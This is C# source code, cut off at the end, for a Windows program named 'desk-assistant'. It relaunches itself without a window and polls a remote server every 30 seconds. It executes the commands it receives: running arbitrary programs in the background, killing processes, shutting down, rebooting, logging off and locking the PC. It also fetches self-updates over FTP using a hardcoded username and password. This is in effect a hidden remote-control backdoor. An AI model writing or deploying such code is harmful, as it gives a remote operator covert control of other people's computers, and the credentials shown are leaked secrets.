using System.Diagnostics;
using System.Runtime.InteropServices;
using FluentFTP;

using Newtonsoft.Json;

using OpenQA.Selenium;
using OpenQA.Selenium.Edge;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Support.UI;

using static DEBUGGER;
using System.Net;
using WebDriverManager;
using WebDriverManager.DriverConfigs.Impl;
using System.IO.Compression;

class Program
{
    [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern int MessageBox(IntPtr hWnd, string text, string caption, uint type);

    public static bool canClose = true;
    public static string ProcessFileName = "";
    public static string? computerId = null;

    public static string make_shortcutPath = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            "desk-assistant",
            "assistant",
            "files",
            "program",
            "program",
            "make_shortcut.bat");

    static async Task Main()
    {
        DebugLogMode();
        string[] args = Environment.GetCommandLineArgs();
        bool enableUI = false;
        bool forceInstall = false;
        bool firstArg = true;
        bool setId = false;

#if DEBUG
        enableUI = true;
        Console.WriteLine("Debug mode enabled. Current arguments (without name):");
        for (int i = 1; i < args.Length; i++)
        {
            Console.WriteLine(args[i]);
        }
        
        args = SetArgs(args);
        static string[] SetArgs(string[] args)
        {
            Console.WriteLine("Do you want to set the arguments manually?");
            Console.WriteLine("If no, running with default settings (Y/N)");
            if (!(Console.ReadLine()?.Trim().Equals("Y", StringComparison.OrdinalIgnoreCase) ?? false))
            {
                return args;
            }
            Console.WriteLine("Set the new arguments, separated by spaces");
            var newArgs = Console.ReadLine()?.Split(' ') ?? new string[0];

            if (args.Length >= 1) {
                string[] tempArgs = new string[1 + newArgs.Length];
                tempArgs[0] = args[0];
                Array.Copy(newArgs, 0, tempArgs, 1, newArgs.Length);
                args = tempArgs;
                return args;
            } else {
                return newArgs;
            }
        }
        Console.WriteLine("Arguments:");
        for (int i = 1; i < args.Length; i++)
        {
            Console.WriteLine(args[i]);
        }
#endif
        foreach (string arg in args)
        {
            if (!firstArg)
            {
                switch (arg.ToLower())
                {
                    case "--lowresources": //lowResources to lowercase
                    case "--lowresourcesmode": //lowResourcesMode to lowercase
                    case "--lowresource":
                    case "--lowresourcemode":
                        // Enable low resources mode
                        Console.WriteLine("Low resources mode");
                        Process currentProcess = Process.GetCurrentProcess();
                        currentProcess.PriorityClass = ProcessPriorityClass.BelowNormal;
                        break;
                    case "--enableui": //--enableUI to lowercase
                    case "--enableconsoleui": //--enableConsoleUI to lowercase
                    case "--enableconsole":
                        enableUI = true;
                        Console.WriteLine("-------------------- ENABLED CONSOLE UI --------------------");
                        break;
                    case "--debug":
                        // Enable debug mode
                        Console.WriteLine("Debug mode (debug lines get logged)");
                        if (logMode != LogMode.LogWithLines)
                        {
                            DebugLogMode(1);
                        }
                        break;
                    case "--debugloglines":
                    case "--debuglogline":
                    case "--debugwithlines":
                    case "--debugwithlinenumbers":
                    case "--debugloglinenumbers":
                        // Enable debug mode
                        Console.WriteLine("Debug mode with numbers (debug lines get logged with line numbers)");
                        DebugLogMode(3);
                        break;
                    case "--forceinstall": //--forceInstall to lowercase
                    case "--forceupdate": //--forceUpdate to lowercase
                    case "--update": //--update to lowercase
                    case "--install": //--install to lowercase
                        forceInstall = true;
                        break;
                    case "--setid":
                    case "--setcomputerid":
                        // Set computer ID
                        setId = true;
                        break;
                    case "--version":
                        // Show version
                        Console.WriteLine("Version: " + VersionInfo.currentVersion);
                        Console.WriteLine("Press any key to continue...");
                        Console.ReadKey();
                        Environment.Exit(0);
                        break;
                    case "--help":
                        ShowHelp();
                        Environment.Exit(0);
                        break;
                    default:
                        Console.WriteLine($"Argument \"{arg}\" not recognised");
                        ThrowError($"Argument \"{arg}\" not recognised", "Wrong argument", 48);
                        break;
                }
            }
            else
            {
                ProcessFileName = arg;
                firstArg = false;
            }
        }

        if (!enableUI)
        {
            StartProcessWithoutUI();
        }

        // Set up the drivers for Selenium
        new DriverManager().SetUpDriver(new ChromeConfig());

        if (File.Exists(make_shortcutPath))
        {
            StartShortcutCreationProcess();
        }
        else
        {
            Version.CheckForUpdates(true);
        }

        LogDebug(VersionInfo.currentVersion);
        HandleConfigFile(setId, enableUI);
        if (computerId == null)
        {
            LogDebug("Computer ID not found. Default value: \"default\".");
            computerId = "default";
        }

        _ = CheckUpdates(forceInstall);

        while (true)
        {
            Dictionary<string, object>? command = (Dictionary<string, object>?)await GetCommands.GetCmds(computerId);
            if (command != null && command.ContainsKey("command"))
            {
                GetCommands.SwitchCmds(command);
            }
            await Task.Delay(30000);
        }
    }

    public static int ThrowError(string message = "Something went wrong.", string title = "Error", uint buttons = 16)
    {
        return MessageBox(IntPtr.Zero, message, title, buttons + 4096);
    }

    static bool CheckUpdates(bool forceInstall = false)
    {
        return Version.CheckForUpdates(forceInstall);
    }

    private static void ShowHelp()
    {
        Console.WriteLine("Help:\n");
        Console.WriteLine("   --enableui or --enableconsoleui:");
        Console.WriteLine("\tEnable the console UI\n");
        Console.WriteLine("   --lowresources, --lowresourcesmode, --lowresource, or --lowresourcemode:");
        Console.WriteLine("\tEnable low resources mode\n");
        Console.WriteLine("   --debug:");
        Console.WriteLine("\tEnable debug mode\n");
        Console.WriteLine("   --debugloglines, --debuglogline, --debugwithlines, --debugwithlinenumbers, or --debugloglinenumbers:");
        Console.WriteLine("\tEnable debug mode with line numbers\n");
        Console.WriteLine("   --forceinstall, --forceupdate, --update, or --install:");
        Console.WriteLine("\tForce the installation of updates\n");
        Console.WriteLine("   --setid or --setcomputerid:");
        Console.WriteLine("\tSet the computer ID\n");
        Console.WriteLine("   --help:");
        Console.WriteLine("\tShow this help message\n");
        Console.WriteLine("   --version:");
        Console.WriteLine("\tShow the version of the program\n");
        Console.Write("\nPress any key to continue...");
        _ = Console.ReadKey();
    }

    private static void StartProcessWithoutUI()
    {
        string currentProcess = Environment.ProcessPath ?? ProcessFileName;
        string arguments = "";
        for (int i = 0; i < Environment.GetCommandLineArgs().Length - 1; i++)
        {
            string arg = Environment.GetCommandLineArgs()[i + 1];
            if (arg != "--enableUI")
            {
                arguments += arg + " ";
            }
        }
        ProcessStartInfo startInfo = new(currentProcess)
        {
            CreateNoWindow = true,
            Arguments = "--enableUI" + arguments
        };
        Process.Start(startInfo);
        Environment.Exit(0);
    }

    private static void StartShortcutCreationProcess()
    {

        ProcessStartInfo make_shortcutStartInfo = new(make_shortcutPath)
        {
            CreateNoWindow = true
        };
        Process.Start(make_shortcutStartInfo);
    }

    private static void HandleConfigFile(bool setId, bool enableUI)
    {
        Dictionary<string, object>? configInfo;
        string computer_id_path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                                   "desk-assistant",
                                   "assistant",
                                   "files",
                                   "program",
                                   "program",
                                   "config.json");
        try
        {
            if (!File.Exists(computer_id_path))
            {
                File.WriteAllText(computer_id_path, "{\"computer_id\": null}");
            }
            string jsonString = File.ReadAllText(computer_id_path);
            configInfo = JsonConvert.DeserializeObject<Dictionary<string, object>?>(jsonString);
            if (configInfo != null && configInfo.ContainsKey("computer_id") && configInfo["computer_id"] is string)
            {
                computerId = (string)configInfo["computer_id"];
            }
            else
            {
                LogDebug("Computer ID not found in config file.");
            }
            if (setId && enableUI)
            {
                Console.WriteLine(computerId == null ? "Do you want to set the computer ID? (Y/N)" : $"Set computer ID: {computerId}\nDo you want to change it? (Y/N)");
                if (Console.ReadLine()?.Trim().Equals("Y", StringComparison.OrdinalIgnoreCase) ?? false)
                {
                    string? readline = Console.ReadLine();
                    computerId = readline ?? throw new ArgumentException("No input received for computerId");
                    File.WriteAllText(computer_id_path, "{\"computer_id\": \"" + computerId + "\"}");
                }
            }
        }
        catch (JsonException ex)
        {
            LogDebug("Error deserializing config file: " + ex.Message);
        }
        catch (IOException ex)
        {
            LogDebug("File error: " + ex.Message);
        }
        catch (UnauthorizedAccessException ex)
        {
            LogDebug("Access error: " + ex.Message);
        }
        catch (Exception ex)
        {
            LogDebug("Error: " + ex.Message);
        }
        if (computerId == null)
        {
            LogDebug("Computer ID not found. Setting computer ID to default value. (\"default\")");
            computerId = "default";
        }
    }
}

static class VersionInfo
{
    public static readonly string currentVersion = "0.2.1";
    public static string versionUrl = "http://site-mm.rf.gd/v/";
    public static bool debug = false;
}















#pragma warning disable CA1050 // Declare types in namespaces
public static class GetCommands
#pragma warning restore CA1050 // Declare types in namespaces
{
    /// <summary>
    /// Retrieves the commands for a specific computer.
    /// </summary>
    /// <param name="computerId">The ID of the computer.</param>
    /// <returns>The dictionary containing the commands, or null if no commands are received.</returns>
    public static async Task<object?> GetCmds(string computerId)
    {
        Dictionary<string, object>? command = null; // Declare variable at the start of the method

        string url = VersionInfo.versionUrl + "commands/get.php";
        int maxRetries = 5;
        for (int attempt = 0; attempt < maxRetries; attempt++)
        {
            try
            {
                Dictionary<string, string> data = new()
                {
                    { "computer_id", computerId }
                };
                var content = new FormUrlEncodedContent(data);
                string responseContent = Version.GetPageContent(url + "?" + content.ReadAsStringAsync().Result);

                LogDebug("TEST responseContent: " + responseContent);
                var jsonResponse = JsonConvert.DeserializeObject<List<Dictionary<string, object>>>(responseContent) ?? throw new Exception("Error reading response from server");
                foreach (var item in jsonResponse)
                {
                    if (item.ContainsKey("error"))
                    {
                        LogDebug("Error: " + item["error"]);
                    }
                    else
                    {
                        string key = "command";
                        if (item.ContainsKey(key))
                        {
                            command = item;
                            break; // If successful, break out of the loop
                        }
                        else
                        {
                            LogDebug("The response does not contain the expected key: " + key);
                        }
                    }
                }
            }
            catch (Exception e)
            {
                LogDebug("\nException Caught!");
                LogDebug("Message: " + e.Message);
                if (attempt < maxRetries - 1) // If this wasn't the last attempt
                {
                    LogDebug("Retrying in 10 seconds...");
                    await Task.Delay(TimeSpan.FromSeconds(10)); // Wait 10 seconds before the next attempt
                }
                else
                {
                    LogDebug("Max retries exceeded. Giving up.");
                }
            }
        }
        if (command == null)
        {
            LogDebug("No commands received.");
            return null;
        }
        else
        {
            return command;
        }
    }


    /// <summary>
    /// Executes the command given in the command dictionary.
    /// </summary>
    /// <param name="command">The command dictionary.</param>
    /// <returns>Returns true if the command was successfully executed; otherwise, false.</returns>
    public static bool SwitchCmds(Dictionary<string, object>? command)
    {
        if (command != null)
        {
            Dictionary<string, string>? parameters = command["parameters"] != null ? JsonConvert.DeserializeObject<Dictionary<string, string>>((string)command["parameters"]) : null;
            string commandKey = "command";
            string? lowerCaseCommand;
            if (command.ContainsKey(commandKey) && command[commandKey] != null)
            {
                lowerCaseCommand = command[commandKey]?.ToString()?.ToLower();
            }
            else
            {
                return false;
            }
            switch (lowerCaseCommand)
            {
                case "showmessage":
                case "showMessage":
                case "message":
                    if (parameters != null)
                    {
                        string message = parameters.ContainsKey("message") ? parameters["message"] : "Something went wrong.";
                        string title = parameters.ContainsKey("title") ? parameters["title"] : "Error";
                        uint buttons = parameters.ContainsKey("buttons") && uint.TryParse(parameters["buttons"], out uint buttonValue) ? buttonValue : 0;
                        Program.ThrowError(message: message, title: title, buttons: buttons);
                    }
                    else
                    {
                        Program.ThrowError(message: "Something went wrong.", title: "Error", buttons: 0);
                    }
                    //Program.ThrowError(message: "Test 0.1.2 12:55 14/02/2024", title: "info", buttons: 0);
                    break;
                case "shutdown":
                case "poweroff":
                    Process.Start("shutdown", "/s /t 0");
                    break;
                case "restart":
                case "reboot":
                    Process.Start("shutdown", "/r /t 0");
                    break;
                case "logoff":
                case "logout":
                    Process.Start("shutdown", "/l");
                    break;
                case "lock":
                case "lockworkstation":
                    [DllImport("user32.dll", SetLastError = true)]
                    static extern bool LockWorkStation();
                    LockWorkStation();
                    break;
                case "forceinstall":
                case "checkforupdates":
                case "update":
                case "forceupdate":
                case "install":
                    _ = Version.CheckForUpdates(true);
                    break;

                case "openbrowser":
                case "openwebpage":
                case "openurl":
                    const string DefaultUrl = "https://www.google.com";
                    string urlToOpen = DefaultUrl;

                    if (parameters != null && parameters.ContainsKey("url"))
                    {
                        urlToOpen = parameters["url"];
                    }

                    if (Uri.IsWellFormedUriString(urlToOpen, UriKind.Absolute))
                    {
                        try
                        {
                            Process.Start(urlToOpen);
                        }
                        catch (Exception ex)
                        {
                            // Log or handle the exception
                            Console.WriteLine($"Failed to open URL: {ex.Message}");
                        }
                    }
                    else
                    {
                        Console.WriteLine($"Invalid URL: {urlToOpen}");
                    }
                    break;
                case "killprocess":
                case "endprocess":
                case "terminateprocess":
                    if (parameters != null && parameters.ContainsKey("processname"))
                    {
                        string processName = parameters["processname"];
                        Process[] processes = Process.GetProcessesByName(processName);
                        foreach (Process process in processes)
                        {
                            if (process.ProcessName.ToLower() == processName.ToLower())
                            {
                                // Try to send a close message
                                bool closeMessageSent = process.CloseMainWindow();

                                if (!closeMessageSent)
                                {
                                    // If the close message wasn't sent, force close the process
                                    process.Kill();
                                }
                            }
                        }
                    }
                    break;
                case "startprocess":
                case "runprocess":
                case "execute":
                    if (parameters != null && parameters.ContainsKey("processname"))
                    {
                        if (parameters.ContainsKey("background") && bool.TryParse(parameters["background"], out bool background) && background)
                        {
                            string processNameParam = parameters["processname"];
                            ProcessStartInfo startInfoParam = new(processNameParam)
                            {
                                CreateNoWindow = true
                            };
                            Process.Start(startInfoParam);
                        }
                        else
                        {
                            string processNameParam = parameters["processname"];
                            ProcessStartInfo startInfoParam = new(processNameParam);
                            Process.Start(startInfoParam);
                        }
                    }
                    break;
                default:
                    return false;
            }
            Console.WriteLine("Command: " + (string)command["command"] + " --- Parameters: " + (string)command["parameters"]);
            return true;
        }
        return false;
    }
}











class Version
{
    public static string GetPageContent(string url)
    {
        Console.WriteLine("\n\nGetting page content...\n");
        IWebDriver driver;
        try
        {
            var edgeOptions = new EdgeOptions();
            edgeOptions.AddArgument("headless"); // Run Edge in headless mode
            driver = new EdgeDriver(edgeOptions);
        }
        catch (WebDriverException webDriverEx)
        {
            try
            {
                Console.WriteLine("Failed to open Edge, trying to use Chrome... Message: " + webDriverEx.Message);
                var chromeOptions = new ChromeOptions();
                chromeOptions.AddArgument("headless"); // Run Chrome in headless mode
                driver = new ChromeDriver(chromeOptions);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Failed to open browser (Selenium). Message: " + ex.Message);
                return "error";
            }
        }

        driver.Navigate().GoToUrl(url);

        var wait = new WebDriverWait(driver, TimeSpan.FromSeconds(10)); // Wait up to 10 seconds
        wait.Until(drv => drv.FindElement(By.TagName("body")));

        string pageContent = driver.FindElement(By.TagName("body")).Text;

        driver.Quit();

        Console.WriteLine("\nPage content received.\n\n");

        return pageContent;
    }

    /// <summary>
    /// Checks for updates and applies them if necessary.
    /// </summary>
    /// <param name="forceInstall">Indicates whether to force the installation of updates.</param>
    /// <returns>True if updates were checked and applied successfully, false otherwise.</returns>
    public static bool CheckForUpdates(bool forceInstall = false)
    {
        Program.canClose = false;

        try
        {
            if (VersionInfo.debug)
            {
                VersionInfo.versionUrl = "https://site-mm.000webhostapp.com/v/debug/";
            }

            /*             string latestVersion = String.Empty;
                        while (latestVersion != "0.1.5")
                        {
                            using HttpClient ftpClient = new();
                            // Set the user agent to a known browser
                            ftpClient.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537");
                            latestVersion = await ftpClient.GetStringAsync(VersionInfo.versionUrl + "getVersion.php");
                            LogDebug("latestVersion: " + latestVersion);
                            Console.WriteLine("\n");
                        } */


            string url = VersionInfo.versionUrl + "version.txt";
            string latestVersion = GetPageContent(url);
            LogDebug("latestVersion: " + latestVersion);

            // Vergelijk de versienummers
            if (IsUpdateAvailable(VersionInfo.currentVersion, latestVersion))
            {
                //LogDebug("latestVersion: " + latestVersion);
                Console.WriteLine($"A new version is available: {latestVersion}");

                // Voer hier logica uit om de update toe te passen indien gewenst
                //string response = Console.ReadLine() ?? "N";
                //string response = "Y";

                //if (response != null && response.Trim().Equals("Y", StringComparison.OrdinalIgnoreCase))
                //{
                Console.WriteLine("Installing update...\n");
                // Download de update
                // Backup van de huidige bestanden

                // Hier zou je de logica moeten toevoegen om de updatebestanden te downloaden en de oude bestanden te vervangen.
                _ = DownloadUpdate(VersionInfo.versionUrl, latestVersion);

                Environment.Exit(3762507597);
                // Restart the application
                //Console.WriteLine("The application is restarting...\n\n\n");
                //Thread.Sleep(1000); // Wait a moment
                // Start a new process to replace the current process
                //Process.Start(Environment.ProcessPath);
                // Exit the current process
                //Environment.Exit(0);
                return true;
                //}
                //else
                //{
                //    Console.WriteLine("De update is geannuleerd.");
                //}
            }
            else
            {
                Console.WriteLine("You have the newest version.");

                // Voer hier logica uit om de update toe te passen indien gewenst
                //string response = Console.ReadLine() ?? "N";
                string response = "N";
                if (forceInstall)
                {
                    response = "Y";
                }

                if (response != null && response.Trim().Equals("Y", StringComparison.OrdinalIgnoreCase))
                {
                    Console.WriteLine("Updating anyway...\n");
                    // Download de update
                    // Backup van de huidige bestanden

                    // Hier zou je de logica moeten toevoegen om de updatebestanden te downloaden en de oude bestanden te vervangen.
                    _ = DownloadUpdate(VersionInfo.versionUrl, latestVersion);

                    Environment.Exit(0);
                    // Restart the application
                    //Console.WriteLine("The application is restarting...\n\n\n");
                    //Thread.Sleep(1000); // Wait a moment
                    // Start a new process to replace the current process
                    //Process.Start(Environment.ProcessPath);
                    // Exit the current process
                    //Environment.Exit(0);
                    return true;
                }
                else
                {
                    Console.WriteLine("Update canceled.");
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error while checking for updates: {ex.Message}");
        }
        finally
        {
            Program.canClose = true;
        }

        return false;
    }

    /// <summary>
    /// Determines if an update is available based on the current version and the latest version.
    /// </summary>
    /// <param name="currentVersion">The current version of the software.</param>
    /// <param name="latestVersion">The latest version of the software.</param>
    /// <returns>True if an update is available, false otherwise.</returns>
    static bool IsUpdateAvailable(
        string currentVersion,
        string latestVersion)
    {
        // Voer hier logica uit om te bepalen of een update beschikbaar is
        // Dit kan bijvoorbeeld een vergelijking van versienummers zijn.

        // Hier is een eenvoudige vergelijking, maar het kan complexer zijn
        return string.Compare(currentVersion, latestVersion) < 0;
    }

    public static string installDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "desk-assistant", "assistant", "files", "program");

    /// <summary>
    /// Downloads the update asynchronously, and installs it.
    /// </summary>
    /// <param name="versionUrl">The URL of the version.</param>
    /// <param name="latestVersion">The latest version.</param>
    /// <returns>A task representing the asynchronous operation. The task result is a boolean indicating whether the update was downloaded successfully.</returns>
    static bool DownloadUpdate(string versionUrl, string latestVersion)
    {
        try
        {
            //using HttpClient ftpClient = new();

            // DEBUG
            LogDebug("\n\n\nUpdating...\n");

            LogDebug("install directory: " + installDir);
            //Console.WriteLine($"Proceed? (Y/N) installDir: {installDir}");
            /* string response = "Y"; //Console.ReadLine() ?? "N";
            if (!(response != null && response.Trim().Equals("Y", StringComparison.OrdinalIgnoreCase)))
            {
                Console.WriteLine("Exiting program...");
                Environment.Exit(0);
            } */
            if (!EnsureDirExists(installDir))
            {
                LogDebug("installDir doesn't exist yet");
            }

            LogDebug("Downloading update...");

            var progress = new Progress<double>();
            double previousProgress = -1;
            DateTime lastUpdate = DateTime.MinValue;
            //int totalBlocks = 40;
            int totalBlocks = Console.WindowWidth - 10;

            // Store the original console color
            ConsoleColor originalColor = Console.ForegroundColor;

            progress.ProgressChanged += (s, e) =>
            {
                // Only update the progress bar if the percentage has changed and at least 20 milliseconds have passed
                if (Math.Floor(e * 2) != Math.Floor(previousProgress * 2) && (DateTime.Now - lastUpdate).TotalMilliseconds > 20)
                {
                    // Calculate completed and remaining blocks
                    int completedBlocks = (int)(e / 100 * totalBlocks);
                    int remainingBlocks = totalBlocks - completedBlocks;

                    // Construct the progress bar string
                    string progressBar = $"[{new string('#', completedBlocks)}{new string('-', remainingBlocks)}] {Math.Floor(e)}%";

                    // Change the color of the progress bar based on the progress
                    Console.ForegroundColor = (e >= 98) ? ConsoleColor.Green : originalColor;

                    // Clear the current line and write the progress bar
                    Console.Write("\r" + progressBar.PadRight(Console.WindowWidth - 1));

                    // Reset the color back to the original color
                    if (e >= 98)
                    {
                        Console.ForegroundColor = originalColor;
                    }

                    // Update previous progress and last update time
                    previousProgress = e;
                    lastUpdate = DateTime.Now;
                }
            };

            Console.Write("\n");
            LogDebug("TEST A");


            string updateFileName = "update.zip";
            string updateFilePath = Path.Combine(installDir, "temp", "version", latestVersion, updateFileName);
            // Check if the update file path is valid
            LogDebug("TEST B");
            string updateDir = Path.GetDirectoryName(updateFilePath) ?? throw new Exception("Invalid update file path.");
            // Ensure the directory for the update file exists;
            LogDebug("TEST C");
            LogDebug("UpdateDir: " + updateDir);
            EnsureDirExists(updateDir);

            LogDebug("TEST D");

            try
            {
                // Get the list of files
                string filesUrl = versionUrl + "data/getFiles.php";
                List<string> fileNames = GetFileNames(filesUrl);
                LogDebug("TEST fileName number 1: " + fileNames[0]);

                foreach (string fileName in fileNames)
                {
                    /* // Download the file
                    using HttpClient ftpClient = new();
                    Console.WriteLine("Downloading file: " + fileName);
                    //byte[] fileBytes = await DownloadDataWithProgress(versionUrl + "data/newest/" + fileName, progress);
                    byte[] fileBytes = await ftpClient.GetByteArrayAsync(Path.Combine(versionUrl, "data", "newest", fileName));

                    // Define the path for the file
                    string filePath = Path.Combine(installDir, "updates", "version", latestVersion, fileName);

                    // Check if the file path is valid
                    string fileDir = Path.GetDirectoryName(filePath) ?? throw new Exception("Invalid file path.");
                    // Ensure the directory for the file exists
                    EnsureDirExists(fileDir);

                    // Write the file data to the file
                    using FileStream fileStream = new(filePath, FileMode.Create, FileAccess.Write);
                    await fileStream.WriteAsync(fileBytes);
                    await fileStream.FlushAsync();*/


                    string ftpUrl = "ftp://ftpupload.net";
                    string username = "if0_36162692";
                    string password = "sitemm728";
                    string localFilePath = Path.Combine(updateDir, fileName);
                    string remoteFilePath = "/htdocs/v/data/newest/" + fileName;

                    FtpClient ftpClient = new(ftpUrl)
                    {
                        Credentials = new NetworkCredential(username, password)
                    };

                    ftpClient.Connect();
                    ftpClient.DownloadFile(localFilePath, remoteFilePath);
                    ftpClient.Disconnect();
                }
                LogDebug("TEST 0.0.0");

                // Define the path for the extracted update
                string extractPath = Path.Combine(installDir, "temp", "latestUpdate");
                // Delete the old extracted update if it exists
                if (Directory.Exists(extractPath))
                {
                    Directory.Delete(extractPath, true);
                }
                // Ensure the directory for the extracted update exists
                EnsureDirExists(extractPath);

                // Define the path for the assembled files
                string assembleFilesPath = Path.Combine(installDir, "temp", "assembleFiles");
                // Delete the old assembled files if they exist
                if (Directory.Exists(assembleFilesPath))
                {
                    Directory.Delete(assembleFilesPath, true);
                }
                LogDebug("TEST 1.1.0");
                // Ensure the directory for the assembled files exists
                EnsureDirExists(assembleFilesPath);


                LogDebug("TEST 1.1.1");
                // Assemble the update files
                extractPath = Path.Combine(extractPath, "extractedFiles");
                AssembleFiles(updateDir, extractPath);
                LogDebug("TEST 1.1.2");

                // Extract the assembled files
                //ExtractZip(assembleFilesPath, extractPath);
                LogDebug("TEST 1.1.3");


                // Define the path for the destination of the update
                string destinationPath = Path.Combine(installDir, "program");

                // Ensure the directory for the destination exists
                EnsureDirExists(destinationPath);
                LogDebug("TEST 1.1.4");
                // Copy the help app to the destination
                File.Copy(
                    Path.Combine(extractPath, "helpapp.bat"),
                    Path.Combine(destinationPath, "helpapp.bat"),
                    true
                );


                // Start the help app
                StartHelpApp(extractPath, destinationPath, installDir);
                LogDebug("TEST 1.1.5");

                // Exit the program
                Environment.Exit(0);

                return true;
            }
            catch (Exception ex)
            {
                // Log any errors that occur
                Console.WriteLine($"An error occurred: {ex.Message}");
                return false;
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error downloading or applying update: {ex.Message}");
            return false;
        }
    }

    private static List<string> GetFileNames(string filesUrl)
    {
        try
        {
            //using HttpClient ftpClient = new();
            string response = GetPageContent(filesUrl);
            LogDebug("filesUrl: " + filesUrl);
            LogDebug("response: " + response);
            List<string> deserialisedResponse = JsonConvert.DeserializeObject<List<string>>(response) ?? throw new JsonException("Error deserialising response");
            return deserialisedResponse;
        }
        catch (JsonException e)
        {
            Console.WriteLine("Error getting file names (JsonException). Message: " + e.Message);
            throw;
        }
    }

    private static bool AssembleFiles(string fromPath, string toPath)
    {
        try
        {
            // Path for the reassembled ZIP file
            string latestUpdateFolderPath = Path.GetDirectoryName(toPath) ?? Path.Combine(installDir, "temp", "latestUpdate");
            string reassembledZipDirPath = Path.Combine(latestUpdateFolderPath, "zipFile");
            string reassembledZipFilePath = Path.Combine(reassembledZipDirPath, "update.zip");
            

            // Check if 7-Zip is available
            string sevenZipPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "7-Zip", "7z.exe");
            if (File.Exists(sevenZipPath))
            {
                // Combine split ZIP files using 7-Zip
                ProcessStartInfo psi = new()
                {
                    FileName = sevenZipPath,
                    Arguments = $"x \"{fromPath}\\updateParts.zip.001\" -o\"{reassembledZipDirPath}\"",
                    //UseShellExecute = false,
                    //RedirectStandardOutput = true,
                    //CreateNoWindow = true
                };

                using Process process = Process.Start(psi) ?? throw new Exception("Failed to start 7-Zip process");
                LogDebug("TEST 7-zip");
                process.WaitForExit();
            }
            else
            {
                LogDebug("7-Zip not found. Using alternative method.");
                // Combine split ZIP files using an alternative method
                string[] splitZipFiles = Directory.GetFiles(fromPath, "update.zip.*");
                string combinedZipFilePath = reassembledZipFilePath;

                // Combine the split ZIP files into a single file
                using FileStream combinedFileStream = new(combinedZipFilePath, FileMode.Create, FileAccess.Write);
                foreach (string splitZipFile in splitZipFiles.OrderBy(name => name))
                {
                    byte[] splitZipFileBytes = File.ReadAllBytes(splitZipFile);
                    combinedFileStream.Write(splitZipFileBytes, 0, splitZipFileBytes.Length);
                }

                // Extract the combined ZIP file
                ZipFile.ExtractToDirectory(combinedZipFilePath, toPath);
            }

            LogDebug("ZIP files combined successfully.");

            if (!File.Exists(Path.Combine(toPath, "MessageTestBlank1.exe")))
            {
                ZipFile.ExtractToDirectory(reassembledZipFilePath, toPath);
                LogDebug("ZipFile extracted");
            }
            return true;
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error occurred while combining ZIP files: {ex.Message}");
            return false;
        }
    }

    static async Task<byte[]> DownloadDataWithProgress(string url, IProgress<double> progress)
    {
        using var ftpClient = new HttpClient();
        using var response = await ftpClient.GetAsync(url, HttpCompletionOption.ResponseHeadersRead);

        var contentLength = response.Content.Headers.ContentLength.GetValueOrDefault(-1L);
        var totalBytes = 0L;
        var readBuffer = new byte[8192];

        using var download = await response.Content.ReadAsStreamAsync();
        using var ms = new MemoryStream();

        while (true)
        {
            var bytesRead = await download.ReadAsync(readBuffer);
            if (bytesRead == 0)
            {
                return ms.ToArray();
            }

            await ms.WriteAsync(readBuffer, 0, bytesRead);
            totalBytes += bytesRead;

            if (contentLength != -1L)
            {
                progress.Report((totalBytes / (double)contentLength) * 100);
            }
        }
    }

    static void StartHelpApp(string beginPath, string destinationPath, string installDir)
    {
        string helperAppPath = Path.Combine(installDir, "program", "helpapp.bat");
        string starterProgram = Environment.ProcessPath ?? Environment.GetCommandLineArgs()[0] ?? Path.Combine(installDir, "program", "MessageTestBlank1.exe");
        Process.Start(helperAppPath, $"{beginPath} {destinationPath} \"{starterProgram}\" false");
        Environment.Exit(0);
    }

     static void ExtractZip(string zipFilePath, string extractPath)
    {
        try
        {
            ZipFile.ExtractToDirectory(zipFilePath, extractPath);
            Console.WriteLine("Update is extracted.");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error extracting update: {ex.Message}");
        }
    }



    static bool EnsureDirExists(string path)
    {
        if (!Directory.Exists(path))
        {
            Directory.CreateDirectory(path);
            return false;
            /*try
            {
                throw new Exception(""); //This is not neccesary
                if (Environment.OSVersion.Platform == PlatformID.Win32NT)
                {
                    LogDebug("Test 1");
                    // Maak een nieuwe DirectorySecurity-object om de machtigingen te beheren
                    DirectorySecurity directorySecurity = new();

                    LogDebug("Test 2");

                    // Krijg de SID voor de "Everyone" groep
                    SecurityIdentifier everyoneSid = new(WellKnownSidType.WorldSid, null);

                    LogDebug("Test 3");

                    // Voeg de gewenste machtigingen toe (bijv. schrijfmachtigingen voor iedereen)
                    directorySecurity.AddAccessRule(new FileSystemAccessRule(everyoneSid, FileSystemRights.Write, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Allow));

                    LogDebug("Test 4");

                    // Krijg toegang tot de directory en pas de nieuwe machtigingen toe
                    DirectoryInfo directoryInfo = new(path);

                    LogDebug("Test 5");

                    directoryInfo.SetAccessControl(directorySecurity);

                    LogDebug("Test 6");

                    Console.WriteLine("Toestemming verleend. Je kunt naar de opgegeven locatie schrijven.");

                    // Voer hier je schrijflogica uit
                    // Bijvoorbeeld: File.WriteAllText(Path.Combine(targetPath, "bestand.txt"), "Hallo, wereld!");

                    return true;
                }
                else
                {
                    // Als het geen Windows is, spring meteen naar het catch-gedeelte
                    throw new PlatformNotSupportedException("Only Windows supported. Trying another way...");
                }
            }
            catch (UnauthorizedAccessException ex)
            {
                Console.WriteLine($"Toestemming geweigerd: {ex.Message}");
                return false;
            }
            catch (Exception ex)
            {
                //Console.WriteLine($"Error: {ex.Message}");
                _ = ex;
                Directory.CreateDirectory(path);
                return false;
            }*/
        }
        else
        {
            return true;
        }
    }

}

class DEBUGGER
{
    public static LogMode logMode = LogMode.Auto;

    public enum LogMode
    {
        Skip = 0,
        Log = 1,
        Auto = 2,
        LogWithLines = 3
    }
    public static void LogDebug(string message, bool forceLog = false, bool logLineNumber = false)
    {
        StackTrace stackTrace = new(true);
